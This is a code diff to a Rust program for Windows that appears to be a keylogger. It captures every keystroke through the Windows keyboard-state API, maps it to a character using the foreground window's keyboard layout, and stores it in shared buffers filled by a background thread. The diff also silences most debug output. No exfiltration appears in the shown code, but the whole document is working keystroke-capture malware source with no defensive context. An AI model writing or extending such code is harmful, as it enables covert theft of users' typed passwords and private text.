@@ -12,12 +12,8 @@ use windows::core::Result;
 use windows::Win32::System::Threading::GetCurrentThreadId;
 use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};
 
-struct Keylogger2 {
-    last_key: Option<i32>, // Stores the last key that was pressed
-}
-
 // Key represents a single key entered by the user
-#[derive(Debug)]
+#[derive(Debug,Clone)]
 struct Key {
     empty: bool, // Indicates if a key is pressed or not
     rune: Option<char>, // The character representation of the key
@@ -35,18 +31,51 @@ impl Key {
 }
 
 fn main() {
-    loop {
-        let next = get_next();
-        println!("next: {:?}", next);
+    let keys1 = Arc::new(Mutex::new(vec![]));
+    let keys2 = Arc::new(Mutex::new(vec![]));
 
-    }
+    // Collection thread
+    let h1 = std::thread::spawn({
+        let keys1 = keys1.clone();
+        move || {
+            loop {
+                let next_key = get_next();
+                // Push to keys1 and keys2
+                {
+                    let mut keys1 = keys1.lock().unwrap();
+                    keys1.push(next_key.clone());
+                }
+                {
+                    let mut keys2 = keys2.lock().unwrap();
+                    keys2.push(next_key.clone());
+                }
+                println!("next: {:?}", next_key);
+            }
+        }
+    });
+
+    h1.join();
+
+    // loop {
+    //     let next_key = get_next();
+    //     // Push to keys1 and keys2
+    //     {
+    //         let mut keys1 = keys1.lock().unwrap();
+    //         keys1.push(next_key.clone());
+    //     }
+    //     {
+    //         let mut keys2 = keys2.lock().unwrap();
+    //         keys2.push(next_key.clone());
+    //     }
+    //     println!("next: {:?}", next_key);
+    // }
 }
 
 fn get_next() -> Key {
     let mut keyboard_state = [0u8; 256];
 
     let next = wait_for_next_key();
-    println!("next: {:?}", next);
+    // println!("next: {:?}", next);
     let t =  unsafe { GetKeyboardState(&mut keyboard_state) };
 
     // Get the handle to the foreground window
@@ -68,7 +97,7 @@ fn get_next() -> Key {
         )
     };
     // println!("typeing {}: {} kb: {:?}", i, code, layout);
-    println!(">>> buff {:?}",  pwszbuff);
+    // println!(">>> buff {:?}",  pwszbuff);
 
     let mut key = Key::new();
     key.empty = false;
@@ -79,21 +108,22 @@ fn get_next() -> Key {
     if let Some(character) = char::from_u32(code_point) {
         // let character = character.to_string();
         if character.is_control() {
-            println!("{} is a control character", code_point);
+            // println!("{} is a control character", code_point);
             key.empty = true;
         } else {
             key.rune = Some(character);
             let character_string = character.to_string();
-            println!("{}", character_string);
+            // println!("{}", character_string);
         }
         // println!(">>> {}", character_string);
     } else {
         key.empty = true;
-        println!("Invalid Unicode code point: {}", code_point);
+        // println!("Invalid Unicode code point: {}", code_point);
     };
 
     key
 }
+
 fn wait_for_next_key() -> i32 {
     let keycodes = get_main_key_codes();
     let mut last_key: Option<i32> = None;
@@ -131,9 +161,7 @@ fn get_main_key_codes() -> Vec<i32> {
 }
 
 fn is_known_win_key(win_key1: i32) -> bool {
-    // let winuser = KeyboardAndMouse::;
     use windows::Win32::UI::Input::KeyboardAndMouse::*;
-    // let win_key = VIRTUAL_KEY::try_from(win_key1 as u16).unwrap();
     let win_key = VIRTUAL_KEY(win_key1 as u16);
     match win_key {
         VK_F1 => true,
